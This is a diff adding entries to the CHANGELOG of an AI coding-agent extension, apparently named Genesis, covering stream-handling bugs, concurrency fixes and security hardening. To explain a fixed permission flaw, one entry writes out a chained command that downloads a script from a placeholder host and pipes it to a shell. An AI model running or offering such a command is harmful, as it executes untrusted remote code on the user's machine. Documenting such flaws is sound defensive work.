@@ -3,6 +3,169 @@
 ## Unreleased
 
 ### Fixed
+
+- **Six ways a stream could end wrong, all of them silent.** Reproduced in
+  `test/stream-boundary.ts`, which is the file that did not exist. A gateway
+  that sent a tool call and then simply stopped, with no `finish_reason`, had
+  that call discarded in the decoder's map: the model had asked to read a file
+  and the user got a blank bubble. A final frame terminated by one newline
+  instead of two was left in the buffer and thrown away, taking the last tokens
+  of the reply or the terminal frame with it. An error delivered inside a 200 —
+  which is how every OpenAI-compatible gateway reports a mid-generation failure
+  — fell through every branch, so a partial answer looked complete.
+  `finish_reason: "length"` was read only as a cue to flush tool calls, so a
+  reply cut off at `maxOutputTokens` ended mid-word looking finished; with the
+  default of 4096 that is the most common way a turn ends badly. And
+  `finish_reason` arriving on the last *content* frame drained before that
+  frame's own argument chunk was read, truncating the call, while a terminal
+  frame carrying no `delta` key at all was skipped entirely.
+
+  Decoders now expose `push`/`flush`, the flush runs at end of stream, the
+  trailing frame is parsed through the same path, and the two stop reasons that
+  mean the answer is incomplete are said out loud with the remedy.
+
+- **The panel was shown the model's thinking.** From the second visible frame
+  onward the loop yielded the raw chunk instead of the filtered one, so a
+  `<think>` block that opened after the first word rendered verbatim into the
+  answer while the saved transcript correctly omitted it. At small frame sizes
+  it left tag fragments — `<ink>` — spliced into the prose instead. Which of the
+  two you got depended on where the gateway split its frames, so it was
+  non-deterministic and could not be reproduced from the session file.
+
+- **The context meter under-reported the whole conversation on the Anthropic
+  wire.** Input tokens arrive once on `message_start` and output on
+  `message_delta`, and the delta yielded `input: 0`. The loop takes the newest
+  usage as authoritative, so a 50k-token conversation read "820 / 200,000" —
+  flagged exact, which is the flag the panel uses to decide a number is worth
+  printing. Wrong in the reassuring direction: the meter never filled and the
+  413 arrived unannounced.
+
+- **Stop during a tool call could fork the transcript.** `interrupt()` declared
+  the turn over the moment Stop was pressed — deleted its entry, cleared the
+  running flag, broadcast a turn end — while the generator was still parked
+  inside a tool call, because `runTool` took no abort signal and a
+  `run_command` could hold it for ten minutes. The composer came back, a second
+  turn started in the same conversation, and the first turn's tail then deleted
+  the *second* turn's entry and ended its UI, leaving a stream nobody could stop
+  appending to the same history array as its predecessor. That produces an
+  assistant message holding tool calls with another turn's user message in
+  between, which the Anthropic wire rejects on the *next* send — by which point
+  nothing connects the failure to the Stop press.
+
+- **Concurrent turns wrote over each other.** `live` has been a map of turns for
+  a while; the state those turns read and wrote was single-valued. The steer
+  queues, the per-turn line estimates, the change list, the message queue, the
+  always-allow flag and the todo list have moved onto the turn or onto a new
+  per-conversation record. A backgrounded turn no longer files its writes under
+  whichever chat is on screen, and switching away no longer discards messages
+  you queued.
+
+- **Stop denied approvals belonging to other conversations.** A backgrounded
+  turn was told "the user declined this edit" about a card nobody had been
+  shown. Approvals carry the turn that asked.
+
+- **A backgrounded turn could not be stopped at all.** `interrupt()` reaches
+  only the visible turn, by design, which left one blocked on an unseen
+  approval or inside a long command running until the window was reloaded. The
+  history list — the only place those conversations appear — now carries a Stop
+  control on every working row.
+
+- **Deleting a conversation with a live turn resurrected it.** The turn ran on
+  and wrote its transcript back after the delete.
+
+- **`run_command` ignored Stop**, and reported a `maxBuffer` overflow as a
+  timeout — sending both the model and the user off to raise a limit that was
+  not the problem.
+
+- **"Always allow" on a command was a first-token match over a shell.**
+  Approving `npm test` once — the obvious first-day action — permanently
+  authorised `npm test; curl https://x/y | sh`, with no card and nothing in the
+  log to tell the two apart. Grants are whole command lines, matched exactly,
+  and a line carrying a shell operator is never remembered at all. Stored under
+  a new key, so no old first-token grant carries over.
+
+- **The offline bundle copied credentials and its README said it had not.**
+  "No credential is in it" was a claim about a convention — profiles are
+  supposed to use `${secret:…}` — stated as a fact about the bytes, and nothing
+  enforced the convention. The copy is scanned now: anything that looks like a
+  credential is replaced in the bundle, and the README lists every redaction by
+  file and line. A clean workspace gets a sentence saying the scan ran.
+
+- **A profile that stopped loading silently moved the conversation to another
+  endpoint.** `activeProfile()` fell back to `profiles[0]` unconditionally, so
+  a YAML typo in an internal gateway's profile sent the next message, and its
+  contents, to whichever profile happened to load first. The fallback now
+  applies only when nothing is selected.
+
+- **Nothing validated `capabilities`.** `contextWindow: 128k` is the string
+  `"128k"` to YAML, which makes the window budget NaN — so the loop told the
+  model "earlier turns were dropped" on every request having dropped nothing,
+  and the meter read `x / NaN`. `maxOutputTokens` at or above `contextWindow`
+  cut history to two messages every turn, so the model appeared to forget the
+  conversation. Both are refused at parse time, by name. Two profiles claiming
+  one name are refused too: a name is what the picker, the connection pool and
+  the token cache are all keyed on.
+
+- **`retries` did nothing.** It was parsed, defaulted, shown in the Control
+  Center and read by nothing. It now applies to connect-level failures and to a
+  5xx with the body still unread — never after a token has streamed, which
+  would bill the prompt twice, and never to a 4xx. Backoff is exponential with
+  jitter.
+
+- **With no folder open, the composer said "Configure an endpoint first".**
+  That names the fix for the other blocking condition. There is nothing to
+  configure: profiles come from the folder you have open, and there is none.
+  The two cases have separate messages, and the welcome screen has an Open
+  folder button rather than a sentence with nothing to press.
+
+- **Path containment compared case-sensitively on Windows**, where
+  `C:\Work\Proj` and `c:\work\proj\file.ts` are the same location. A file the
+  user was looking at could be judged outside the workspace.
+
+### Changed
+
+- **Genesis declares that it does not support untrusted workspaces.** An
+  endpoint profile can name a transform module — arbitrary JavaScript, run
+  before the first request — or an `exec` credential helper, and `.agent/mcp.json`
+  names programs to launch. That is the real boundary around all of it, and the
+  manifest had left it to a default. The composer also stopped pre-warming on
+  focus: warming builds the client, which runs those programs, and clicking
+  into a text box is not a request to.
+
+- **`node:vm` is documented as what it is.** The comment beside the transform
+  loader's narrowed `require` read as a claim that a transform could not reach
+  the filesystem or the network. It can; `vm` is an isolation primitive, not a
+  security boundary.
+
+- **MCP servers are killed as a process tree and given an environment
+  allowlist.** The canonical command is a launcher that spawns the real server,
+  so killing the direct child orphaned it — every window reload could leave
+  another behind. And a server named by a file in the open workspace was handed
+  every variable the user's shell exported.
+
+- **`search` refuses a pattern shaped like catastrophic backtracking**, and has
+  a wall-clock budget for everything merely slow. A model-authored
+  `(\s*\w+)+$` froze the extension host, taking every other extension in the
+  window with it — and taking Stop with it, because Stop is a message a frozen
+  host cannot process.
+
+- **The webview CSP nonce comes from `crypto`** rather than `Math.random()`. It
+  is the entire `script-src`.
+
+- **The two halves compare builds.** A webview VS Code served from its cache
+  after an update produced a control that did nothing, with no error and no log
+  line. Both sides also log a message they do not recognise instead of dropping
+  it.
+
+- **The test runner discovers suites instead of being told about them.**
+  `npm test` was a 3,000-character string naming fifty files by hand and
+  `test:bundle` was a second copy of it. `mentions.cjs` — 99 assertions over the
+  `@`-mention path — was referenced by no script at all, so the fix it covers
+  shipped with a test that had never executed. `npm run verify` now runs
+  everything that does not need a live endpoint, including the suites that read
+  the packaged `.vsix`.
+
+### Fixed (earlier in this cycle)
 - **The controls whose border IS the control now have a visible one.** Measured
   on the shipped panel, the composer's outline sat at **1.47:1** against the
   ground and every outlined button — send, attach, mode, the phase segment, and
